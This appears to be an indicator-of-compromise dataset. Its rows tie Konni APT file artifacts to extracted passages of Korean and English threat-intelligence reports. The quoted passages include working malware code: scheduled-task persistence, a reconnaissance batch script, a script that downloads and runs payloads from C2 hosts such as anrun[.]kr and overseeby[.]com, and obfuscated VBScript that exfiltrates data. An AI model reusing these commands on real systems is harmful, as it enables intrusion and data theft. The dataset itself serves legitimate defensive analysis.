1.0.0,actor--konni,artifact--sha256:baa5f4c5894571dcdfe1992f2342db6173dd24c92719732fbc4aec6a8f2fe5de,observation--sha256:bf57259d298c701ebea6969c90ed63433daa5728b0b50c11d42d2e1ff5788ddf,file-name,stopedge.bat,stopedge.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:baa5f4c5894571dcdfe1992f2342db6173dd24c92719732fbc4aec6a8f2fe5de,observation--sha256:ac55f2c9b0151fb48a203383f5159c987ed67525ae5e72ce3a546751e7eb7b7e,file-name,stopedge.bat,stopedge.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 주요 문자열은 10진수 값으로 선언되어 있고, XOR 로직을 통해 ASCII 문자로변환되는과정을거치게됩니다. [그림4-1] 'update.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 25개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'stopedge.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'install.vbs' 파일코드분석 ○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다. Genians SecurityCenter 19",
1.0.0,actor--konni,artifact--sha256:baa5f4c5894571dcdfe1992f2342db6173dd24c92719732fbc4aec6a8f2fe5de,observation--sha256:f1dc65df880bfde64a41025e448fd7b2eb364c8f0f46df20451b4723340c86c2,file-name,stopedge.bat,stopedge.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:baa5f4c5894571dcdfe1992f2342db6173dd24c92719732fbc4aec6a8f2fe5de,observation--sha256:bdac9b9691c15f0a70ab515f056fa0d50ed0ec703ff6e2d16f6cd65af27d5652,file-name,stopedge.bat,stopedge.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:baa5f4c5894571dcdfe1992f2342db6173dd24c92719732fbc4aec6a8f2fe5de,observation--sha256:214e678f442ee4543c1499bddd0ce3234fb2a0f75968c6b8e6c91fa2d19c9ce5,file-name,stopedge.bat,stopedge.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:baa5f4c5894571dcdfe1992f2342db6173dd24c92719732fbc4aec6a8f2fe5de,observation--sha256:dd003e75e981a322054bb0d645e984f815a8aae36bd57cb99561b6b6aa0aa02b,file-name,stopedge.bat,stopedge.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:baa5f4c5894571dcdfe1992f2342db6173dd24c92719732fbc4aec6a8f2fe5de,observation--sha256:68b31c674b185fc38f6bd4054eb0e08b82cf815e94471be6f2c8fe4e8fdf5fab,file-name,stopedge.bat,stopedge.bat,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:baa5f4c5894571dcdfe1992f2342db6173dd24c92719732fbc4aec6a8f2fe5de,observation--sha256:767dbaee36151b17232c487f2d437b7aff5e2e889285cdc1f0bd8d335e046761,file-name,stopedge.bat,stopedge.bat,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain update.vbs The'update.vbs' closelyresembles'install.vbs,' employingthesameobfuscationtechniquesandperformingidentical tasks. Figure5- Obfuscatedupdate.vbs However, itsdistinctivefeatureisthat it executesascript named'stopedge.bat'. Figure6- Deobfuscatedupdate.vbs 7",
1.0.0,actor--konni,artifact--sha256:8587331300ac42b40ff9d91223e23384c0db15916502ed7ab9aa48eb01bcfd2f,observation--sha256:2d1532b2249356b3559967d6a6fdab7bcd99490737c73f04bc44558e0164ebeb,file-name,temprun.bat,temprun.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:8587331300ac42b40ff9d91223e23384c0db15916502ed7ab9aa48eb01bcfd2f,observation--sha256:619273e288f67c19d990abf9115bfc368261238047d5d078ce98961af7ca3a1c,file-name,temprun.bat,temprun.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 25 ○ (goto 1) 루틴으로 점프하면, 가장 먼저 ‘temprun.bat’ 파일이 있는지 비교하고 존재할 경우 삭제를 진행합니다. 그리고 call 배치 명령을 통해 ‘19288086.bat’ 파일을 호출합니다. call 19288086.bat ""http://overseeby[.]com/list.php?f=%COMPUTERNAME%.txt"" ""%~dp0IxOkj.cab"" ""1""> nul expand IxOkj.cab -F:* %~dp0 > nul del /f /q IxOkj.cab > nul call temprun.bat > nul [표 09] C2 호스트에서 압축파일 다운로드 및 실행 과정 화면 ○ C2(overseeby [.]com) 명령을 통해 감염된 컴퓨터명의 파일이 서버에 존재할 경우 ‘IxOkj.cab’ 이름으로 다운로드하고 ‘expand’ 명령을 통해 압축을 풀고 삭제합니다. ",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:e0951d90db302558a6ad924f97ba7d2f75e9b4b21fd98bdb113b673a8890b65c,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:5bb6c18362d252b4f764b1f36ffe4d910c699dcd89e1e9b95fec591789ca41ef,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 32개의 연산 항목을 문자열로 변경하면 다음과 같이 Microsoft.XMLHTTP GETAdodb.Stream개체내용을확인할수있습니다. ■'unactivate.vbs' 파일코드분석 ○'unactivate.vbs' 파일은'versioninfo.bat' 파일에의해호출되는스크립트입니다.해당 스크립트는 지정된 컴퓨터명(% COMPUTERNAME%) 과 수집된 각종 컴퓨터내부정보를조합해C2서버( anrun[.]kr) 로전송하는데사용됩니다. OnError ResumeNextRFzWb6Sh=Left(WScript.ScriptFullName,InstrRev(WScript.ScriptFullName, ""\"") - 1) cal9zs0a9i =""=zm32LT_9G1RZlG9'""CbJO1dpnUt1=CbJO1dpnUt1&Chr(7810Xor 7887):CbJO1dpnUt1=CbJO1dpnUt1&Chr(16776Xor 16865):CbJO1dpnUt1=C",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:5a94cc39cf99187cff56d9132abde2bd65502156bc887ee3603c8a58640103f1,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport mvidFmMBN2=mvidFmMBN2&Chr(29256Xor 29242):mvidFmMBN2=mvidFmMBN2&Chr(14377Xor 14405):mvidFmMBN2=mvidFmMBN2&Chr(15285Xor 15312)mvidFmMBN2=mvidFmMBN2&Chr(2288Xor 2206):mvidFmMBN2=mvidFmMBN2&Chr(2684Xor 2591)mvidFmMBN2=mvidFmMBN2&Chr(11242Xor 11141):mvidFmMBN2=mvidFmMBN2&Chr(55171Xor 55271):mvidFmMBN2=mvidFmMBN2&Chr(33833Xor 33868):mvidFmMBN2=mvidFmMBN2&Chr(14596Xor 14688):HmElL=mvidFmMBN2 pR1rSrG8kRT.setRequestHeader uNAPAT, HmElL Kb37Qal =""!)('@#7U5{]Y);""DYcicX1=DYcicX1&C",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:4d0f3f5d50a23eac22cfd574e15ed8654cbb3e74c46aa2ccd6b15c552c6a3a7e,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○사용자정보를모으기위해DIR명령을통해주요경로의디렉토리구성과파일정보,공인 아이피 주소 및 프로세스 리스트, 시스템 정보 등을 텍스트 파일(. data) 로저장합니다. 파일명 내용 cuserdown.data Downloads 경로의디렉토리구조와파일정보 cuserdocu.data documents 경로의디렉토리구조와파일정보 cuserdesk.data desktop경로의디렉토리구조와파일정보 cprog.data ProgramFiles 경로의디렉토리구조와파일정보 cprog32.data ProgramFiles (x86) 경로의디렉토리구조와파일정보 ipinfo.data 공인아이피주소 tsklt.data 실행프로세스정보 systeminfo.data OS종류, 모델, 바이오스버전등주요시스템정보[표4-7] 외부로유출시도되는파일및내용 ○ 사용자 정보 수집 명령이 진행된후약5초간시간지연이됩니다. 그다음수집된개인정보가전송될C2서버( anrun[.]kr) 를환경변",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:818ede20ce5027de52dc38cf17f26a726289f03d3e9ddda43aae75c2c94d75b2,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:a1d80142ccfe75707d4606a82ce6a7bcc5cc895aa3f98bfdf84edd6760bca769,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain unactivate.vbs Unliketheother scripts, 'Unactive.vbs' isamoreextensiveone. Yet, whenitsobfuscatedcodeisunraveled, it becomesapparent that it hasthepotential for exfiltration. Thisisachievedthroughtheexecutionof aPOSTrequest, incorporating'name' and'data' fields. Figure9- Obfuscatedformof unactivate.vbs Figure10- Deobfuscatedformof unactivate.vbs 9",
1.0.0,actor--konni,artifact--sha256:ff79acc63809558dbb3f045b524fc6145cd887a54f5a92b828d856a8eb4eeb38,observation--sha256:ba0a0a96bc2c634349e9c29825af490ff357da491e7f1758bc24326bb2ae220c,file-name,unactive.vbs,unactive.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain versioninfo.bat The'versioninfo.bat' script playsapivotal roleintheoperation. It gathersdiverseinformationabout theuser'scomputer, suchasdirectorylistings, IPaddresses, runningprocesses, andsystemdetails, andthenexfiltratesthisdatawiththeassistanceof 'unactive.vbs,' whichwe'vepreviouslyanalyzed. Figure13- Attackchainendswithdataexfiltration MITREATT&CK TechniqueName TechniqueID Phishing:SpearphishingLink T1566.002CommandandScript",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:796b2e9da6a854c4d9155426e6fe592cd76bafe2941159c606c9a47a4952ebd0,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:93fba549efc19d7bdfb29010d58c9f69c22d4014bda393c2e4aedb57a85f2c06,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:3de4ee7f6c495b947620c2d7959e2163e66f97a59bebd5038f6443c887a129f9,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:67f7701eb76562252e11290738ed40fc832c257581c472068a6c1231af195369,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:59ee79efad4360522cb4a1aef47bbfe78b000fd5b17381368b2fd88e18c551b0,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:eeda8f82fc006251603d8ad35649e79ce05522c6a5c4252b6f1350a59288b945,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:39e2f24cf75a0db0b752e39a425f593fda7c6e13b6a8734413dd152c4114e04b,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:1fba304000043d6a9872cd6c612b2331bbab16af6bcf4166cd2202c75214a2cc,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
